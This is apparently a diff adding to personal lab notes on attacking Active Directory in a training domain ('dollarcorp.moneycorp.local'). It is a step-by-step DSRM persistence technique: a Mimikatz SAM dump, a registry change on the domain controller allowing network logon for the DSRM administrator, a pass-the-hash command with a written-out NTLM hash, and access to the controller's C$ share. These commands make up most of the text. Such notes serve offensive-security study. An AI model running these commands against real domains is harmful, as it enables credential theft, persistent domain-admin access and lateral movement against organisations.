@@ -89,3 +89,15 @@ Enter-PSSession -Session $sess
 ```powershell
 Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
 ```
+The DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC
+```powershell
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+![[Pasted image 20231025115059.png]]
+Now from the attack box we can simply pas the hash and use the dsrm administrator session
+```powershell
+Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+```
+```powershell
+ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
+```
